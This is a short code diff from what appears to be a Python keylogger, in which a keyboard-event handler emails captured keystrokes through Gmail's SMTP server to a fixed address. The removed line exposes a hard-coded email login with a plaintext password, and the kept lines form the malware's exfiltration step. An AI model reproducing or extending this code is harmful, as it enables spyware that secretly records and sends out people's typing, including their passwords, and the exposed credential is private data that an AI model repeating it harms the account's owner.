@@ -18,7 +18,7 @@ def OnKeyboardEvent(event):
         mail = smtplib.SMTP('smtp.gmail.com',587)
         mail.ehlo()
         mail.starttls()
-        mail.login('nishantnischaya@gmail.com','Minku@1234')
+        mail.login('nishantnischaya@gmail.com','PASSWORD')
         mail.sendmail('nishantnischaya@gmail.com','nishantnischaya@gmail.com',content)
         mail.close()
         fo.seek(0)
